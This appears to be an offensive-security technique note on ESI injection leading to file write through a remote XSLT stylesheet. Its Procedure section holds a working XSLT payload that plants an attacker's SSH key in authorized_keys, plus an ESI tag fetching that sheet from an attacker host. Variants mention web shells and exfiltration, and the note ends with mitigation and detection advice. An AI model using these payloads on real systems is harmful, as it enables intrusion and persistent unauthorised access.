---
title: ESI injection — from a tag to file write
tags: [web, esi, xslt, file-write, rce]
---

# ESI injection — from a tag to file write

[🇪🇸 Español](esi-injection-file-write.md) | **English**

## Concept

Edge Side Includes (ESI) compose responses at the proxy/cache. If the application processes user tags and accepts an XSLT `stylesheet`, it can load a remote sheet that writes files through `xsl:result-document` or processor extensions. On a host with SSH, writing `authorized_keys` is execution.

## When it applies

- The application reflects messages, comments or tickets and the proxy has ESI enabled.
- The `stylesheet` or `src` parameter is unrestricted.
- The process can write to a user's home or a served path.

## Procedure

1. Confirm processing with `<esi:include src="http://localhost/"/>`.
2. Host an XSLT sheet that uses `xsl:result-document`.
3. Target `/home/<user>/.ssh/authorized_keys`.
4. SSH in with the matching key.

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="/home/sam/.ssh/authorized_keys">
      <xsl:text>ssh-ed25519 AAAA... attacker</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

```text
<esi:include src="http://localhost/" stylesheet="http://<ATTACKER>/write.xsl"></esi:include>
```

## Variants

- Write a `.php` or `.jsp` into the document root.
- Use `document()` to read files and exfiltrate them.
- If the proxy caches, poison the response for other users.

## Limitations

- The XSLT processor must allow `result-document` and writes.
- The path must be writable by the proxy user.
- ESI may be restricted to trusted origins.

## Mitigation and detection

- Disable ESI or validate tags and origins.
- Do not allow a user-controlled `stylesheet`.
- Run the proxy as a user without home access.
- Monitor writes to `.ssh` and new files in the document root.

## References

- <https://www.w3.org/TR/esi-lang/>
- <https://www.w3.org/TR/xslt-30/>
- <https://book.hacktricks.wiki/en/pentesting-web/esi-injection.html>
